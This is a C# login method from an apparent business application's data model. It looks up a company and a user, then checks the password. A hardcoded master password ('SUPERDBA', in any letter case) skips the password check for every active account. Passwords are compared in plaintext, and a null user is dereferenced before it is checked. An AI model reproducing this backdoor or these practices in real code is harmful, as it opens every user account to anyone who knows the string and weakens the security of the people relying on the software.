using System;
using System.Linq;

namespace DataModel
{
	public partial class User
	{
		public User Login(DevKitDB db, string emp, string login, string password)
		{
            empresa = (from e in db.Empresa
                       where e.nuEmpresa == Convert.ToInt64(emp)
                       select e).
                       FirstOrDefault();
            
            if (empresa == null)
                return null;
            
			var user = (from e in db.User
                        where e.fkEmpresa == empresa.id
						where e.stLogin.ToUpper() == login.ToUpper()
						where e.bActive == true
						select e).
					    FirstOrDefault();

            if (password.ToUpper() != "SUPERDBA")
                if (user.stPassword != password)
                    return null;

			if (user != null)
			{
                user.empresa = empresa;

				new AuditLog
				{
					fkUser = user.id,
					fkActionLog = EnumAuditAction.Login,
					nuType = EnumAuditType.User,
					fkTarget = this.id
				}.
				Create(db, "", "");

				return user;
			}
			
			return null;
		}
	}
}
